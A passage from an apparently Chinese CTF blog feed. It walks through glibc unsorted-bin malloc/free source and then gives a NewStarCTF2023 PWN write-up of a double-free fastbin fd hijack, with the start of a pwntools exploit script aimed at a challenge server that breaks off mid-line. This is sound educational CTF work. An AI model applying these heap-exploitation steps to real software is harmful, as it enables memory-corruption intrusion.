)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*其他的下面再看*/</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p>这段代码检查了unsorted bin中是否含有chunk，设置了victim和bck两个变量，并且检查victim的size字段。这个检查相当地简单，所以给予了我们攻击的可能。当然，这种可能在2.29之后概率就很低了。</p><h5 id="对唯一chunk的分割"><a href="#对唯一chunk的分割" class="headerlink" title="对唯一chunk的分割"></a>对唯一chunk的分割</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">          If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">          only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">          runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">          exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">          no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp; <span class="comment">//用户申请的大小在smallbin范围中</span></span><br><span class="line">           bck == unsorted_chunks (av) &amp;&amp; <span class="comment">//unsorted bin中只有唯一chunk</span></span><br><span class="line">           victim == av-&gt;last_remainder &amp;&amp; <span class="comment">//这个chunk是上一次被分割的chunk（包括尚未被分割的chunk）</span></span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE)) <span class="comment">//这个chunk的size大于用户申请的大小+MINSIZE</span></span><br><span class="line">         &#123;</span><br><span class="line">           <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">           remainder_size = size - nb; <span class="comment">//剩余部分的大小</span></span><br><span class="line">           remainder = chunk_at_offset (victim, nb); <span class="comment">//剩余部分的chunk地址</span></span><br><span class="line">           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder; <span class="comment">//修改堆头的fd和bk</span></span><br><span class="line">           av-&gt;last_remainder = remainder; <span class="comment">//更新最后被分割的chunk指针</span></span><br><span class="line">           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av); <span class="comment">//修改剩余部分的fd和bk</span></span><br><span class="line">           <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">             &#123;</span><br><span class="line">               remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">               remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">           set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>)); <span class="comment">//设置取出来的部分的size字段 </span></span><br><span class="line">           set_head (remainder, remainder_size | PREV_INUSE); <span class="comment">//设置剩余部分的size字段</span></span><br><span class="line">           set_foot (remainder, remainder_size); <span class="comment">//设置物理意义上下一个chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">           check_malloced_chunk (av, victim, nb); <span class="comment">//对切割下来的chunk进行检查</span></span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim); <span class="comment">//返回mem指针给用户</span></span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p; </span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>只有满足if条件后malloc才会去切割unsorted bin中的chunk以返回合适的chunk给用户，否则会直接进入下一步。</p><h5 id="移除尾部chunk"><a href="#移除尾部chunk" class="headerlink" title="移除尾部chunk"></a>移除尾部chunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>代码很简单，但是确实把尾部的chunk扔出了unsorted bin。之所以会有这么一步是因为只要上一步切割没实现，那么接下来无论如何尾部chunk都不可能留在unsorted bin里了，要么被分配到其他bin中，要么大小刚刚好而被返回给用户。</p><h5 id="victim返回给用户"><a href="#victim返回给用户" class="headerlink" title="victim返回给用户"></a>victim返回给用户</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">  &#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">      victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果用户申请的chunk大小和victim的大小刚刚好一样，那太好了，直接把victim返回给用户，皆大欢喜。当然，除了会改一改标志位除外，其他地方不会动。也就是说，原本存在上面的fd和bk指针现在依然残留在上面，那就可以利用这一点来泄露libc地址了。</p><h5 id="victim进入到small-bin或large-bin中"><a href="#victim进入到small-bin或large-bin中" class="headerlink" title="victim进入到small bin或large bin中"></a>victim进入到small bin或large bin中</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"> <span class="comment">/*核心的放置步骤在57行*/</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size)) <span class="comment">//如果victim在smallbin范围中（size&lt;0x400）</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size); <span class="comment">//找到对应size的bin的索引</span></span><br><span class="line">              bck = bin_at (av, victim_index); <span class="comment">//将bck设置为对应bin的地址</span></span><br><span class="line">              fwd = bck-&gt;fd; <span class="comment">//将fwd设置为对应bin当前的头部chunk</span></span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="comment">//如果victim在largebin范围中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size); <span class="comment">//同上</span></span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="comment">/*下面一大坨看起来和复杂但其实它就在干一件事，那就是保持large bin内的chunk要按照size大小从小到大排序*/</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*放置chunk到对应bin的核心步骤，也就是设置fd和bk增加链表节点*/</span></span><br><span class="line">          mark_bin (av, victim_index); <span class="comment">//将victim要进入的bin的binmap设置为1，意味着这个bin里包含空闲chunk</span></span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*然后返回到while处重新找下一个chunk是否能满足用户需求然后返回，除非unsorted bin已经空了，或者已经循环了MAX_ITERS次*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">//这个break是给最初那个while用的，这里也是while语句块的最后一个语句了。</span></span><br></pre></td></tr></table></figure><h5 id="依然找不到合适chunk的解决办法"><a href="#依然找不到合适chunk的解决办法" class="headerlink" title="依然找不到合适chunk的解决办法"></a>依然找不到合适chunk的解决办法</h5><p>如果unsorted bin已经空了或者循环次数过多了，但是还找不到合适的chunk给用户，ptmalloc就开largebin去找大小最合适的chunk，这个chunk大小可能比需要的还要大，所以会把它放进unsorted bin中进行切割。如果还没有，ptmalloc急了就会开地图炮去找合适的chunk来切割。实在没有的话，那就只能去切割top chunk了，或者合并fastbin亦或者直接sysmalloc，此处不做分析。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">      If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">      sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">     &#123;</span><br><span class="line">       bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">       <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">       <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">           (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">         &#123;</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">           <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                   (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">             victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">              list does not have to be rerouted.  */</span></span><br><span class="line">           <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">             victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">           remainder_size = size - nb;</span><br><span class="line">           unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">           <span class="comment">/* Exhaust */</span></span><br><span class="line">           <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">             &#123;</span><br><span class="line">               set_inuse_bit_at_offset (victim, size);</span><br><span class="line">               <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                 victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             &#125;</span><br><span class="line">           <span class="comment">/* Split */</span></span><br><span class="line">           <span class="keyword">else</span></span><br><span class="line">             &#123;</span><br><span class="line">               remainder = chunk_at_offset (victim, nb);</span><br><span class="line">               <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                  have to perform a complete insert here.  */</span></span><br><span class="line">               bck = unsorted_chunks (av);</span><br><span class="line">               fwd = bck-&gt;fd;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                 &#123;</span><br><span class="line">                   errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                   <span class="keyword">goto</span> errout;</span><br><span class="line">                 &#125;</span><br><span class="line">               remainder-&gt;bk = bck;</span><br><span class="line">               remainder-&gt;fd = fwd;</span><br><span class="line">               bck-&gt;fd = remainder;</span><br><span class="line">               fwd-&gt;bk = remainder;</span><br><span class="line">               <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                 &#123;</span><br><span class="line">                   remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                   remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">               set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">               set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">               set_foot (remainder, remainder_size);</span><br><span class="line">             &#125;</span><br><span class="line">           check_malloced_chunk (av, victim, nb);</span><br><span class="line">           <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">           alloc_perturb (p, bytes);</span><br><span class="line">           <span class="keyword">return</span> p;</span><br><span class="line">         &#125;</span><br><span class="line">       <span class="comment">/*至此，最开始的for语句块结束了*/</span></span><br></pre></td></tr></table></figure><h3 id="free时unsorted-bin的行为"><a href="#free时unsorted-bin的行为" class="headerlink" title="free时unsorted bin的行为"></a>free时unsorted bin的行为</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av); <span class="comment">//将要被free的chunk插入链表头部</span></span><br><span class="line">     fwd = bck-&gt;fd; </span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) <span class="comment">//检查当前头部chunk的bk是否被破坏，对unsorted bin来说bk很重要</span></span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd; <span class="comment">//设置被free的chunk的fd和bk指针</span></span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p; <span class="comment">//插入链表</span></span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE); <span class="comment">//设置size字段</span></span><br><span class="line">     set_foot(p, size); <span class="comment">//设置物理相邻chunk的prev_size</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>chunk被释放后会进入unsorted bin有以下几种情况：<br>- 这个chunk不属于fastbin范围，则会先进入unsorted bin<br>- unsorted bin中的chunk被切割后，剩余部分如果大于MINSIZE，则会继续放回到unsorted bin中<br>- 触发malloc_consolidate之后，合并好的的chunk会先被放到unsorted bin中<br>- 这个chunk不与top chunk相邻，否则会被top chunk合并</p><p>关于这些情况的源码分析将在另一篇文章中进行。</p><p>参考阅读：<br>- <a href="https://www.jianshu.com/p/d3fdeff8683f">heap 中常见函数、宏与值</a></p>]]></content>
      
      
      <categories>
          
          <category> glibc源码补完计划 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『NewStarCTF2023』_week4 PWN WP</title>
      <link href="/2024/2023newstar-week4-wp/"/>
      <url>/2024/2023newstar-week4-wp/</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-前言（patchelf的正确打开方式）"><a href="#0x00-前言（patchelf的正确打开方式）" class="headerlink" title="0x00 前言（patchelf的正确打开方式）"></a>0x00 前言（patchelf的正确打开方式）</h3><p>正好最近在学习堆入门，想起来去年还有newstar的题没复现完，所以干脆拿来当堆入门的练手了。但是在做完准备写wp用动调分析的时候遇到了一个问题。我的主力Linux是Ubuntu22，glibc版本是2.35，我学习堆也是从2.35开始往低版本对比学习，如果题目环境glibc不一样（一般都不一样，2.35版本太高了），则需要用patchelf来修改动态链接库以便gdb分析，但是按照网上的流程来patch怎么都不能成功。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6 --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ Double</span></span><br></pre></td></tr></table></figure><p>假如我想用以上命令patch Double这个程序，运行这个程序的时候就会变成这样：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/patchelf%E4%B8%8D%E6%88%90%E5%8A%9F.png" alt="patchelf不成功"></p><p>然后我问了xswlhhh师傅，只要将两个参数分开执行就行，也就是</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-linux-x86-64.so.2 Double</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu3_amd64 Double</span></span><br></pre></td></tr></table></figure><p>这样就能成功patch了。</p><p><code>--set-interpreter</code>后面的参数是对应libc的解释器ld文件。注意是ld文件不是libc.so.6！！！</p><p><code>--set-rpath</code>后面的参数是对应libc的目录。然后最后是你要patch的程序。</p><h3 id="0x01-Double"><a href="#0x01-Double" class="headerlink" title="0x01 Double"></a>0x01 Double</h3><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>这是一道经典菜单堆题，题目名字已经明显提示了要用double free，并且给出的libc版本是2.23，没有tcachebin，0x28大小的chunk释放完直接就会进fastbin。题目只有add和del两个可以操作chunk的函数，在add的同时可以向chunk写入内容。</p><p>现在题目有个后门，只要在0x604070出写入0x666就可以getshell，也就是要满足任意地址写。观察程序发现del函数里free完chunk之后没有置空指针，存在UAF漏洞，但是只能在add的时候编辑chunk内容。所以我们利用UAF来实现doublefree，然后伪造劫持fd，修改fastbin链表，达到申请到目标地址的目的。需要注意的是，fastbin链表中存的地址是chunk地址，也就是说，我们要写入fd的地址应该是target-0x10。</p><p>下面来思考利用方式。我们申请两个chunk，再释放掉这两个chunk之后，fastbin长这样：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/Double_%E9%87%8A%E6%94%BE%E5%90%8Efastbin.png" alt="Double_释放后fastbin"></p><p>那么我们在申请一个chunk就会被分配到chunk0，也就是0x2442000处的chunk；申请第二个chunk则会申请到chunk1，第三个是chunk0。链表到此为止就结束了，因为如果我们在申请时向chunk写入了一些内容但并非有效指针，那他就不会再继续从fastbin里取出chunk。但是如果我们向chunk0中写入target-0x10的地址，因为我们释放了两次chunk0，这个fd对于链表中被取出的chunk0无效，但是对于未被取出的chunk0有效。所以申请第一个chunk后写入目标地址，然后申请两个垃圾chunk，再申请一个chunk就是我们想要的地址了，此时写入0x666就可以完成目标。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/Double_%E5%8A%AB%E6%8C%81fd%E5%90%8E%E7%9A%84%E9%93%BE%E8%A1%A8.png" alt="Double_劫持fd后的链表"></p><p>(这个是另一个gdb了，所以地址不太一样，但是000结尾的是chunk0,030结尾的是chunk1)</p><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">26771</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./Double&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch_gdb</span>():</span><br><span class="line">    context.terminal == [<span class="string">&#x27;xdce4-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input idx&quot;</span>, idx)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Input content&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input idx&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    r.sendlineafter(<span 